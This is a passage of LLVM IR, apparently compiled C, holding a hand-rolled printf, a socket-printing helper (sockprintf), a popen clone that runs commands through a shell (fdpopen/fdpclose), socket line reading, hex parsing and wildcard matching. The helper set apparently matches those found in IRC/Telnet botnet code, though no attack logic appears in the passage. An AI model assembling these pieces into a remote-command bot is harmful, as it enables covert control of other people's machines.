  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #15
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #3
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #3
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.130, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.131, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
